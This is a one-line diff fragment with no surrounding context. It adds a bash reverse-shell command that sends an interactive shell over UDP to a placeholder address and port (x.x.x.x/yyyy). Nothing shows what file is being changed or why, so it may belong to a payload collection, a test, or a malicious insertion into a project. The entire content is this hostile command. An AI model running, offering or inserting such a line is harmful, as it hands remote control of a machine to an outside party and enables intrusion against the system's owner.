@@ -1,0 +1,1 @@
+/bin/bash -i >& /dev/udp/x.x.x.x/yyyy 0>&1
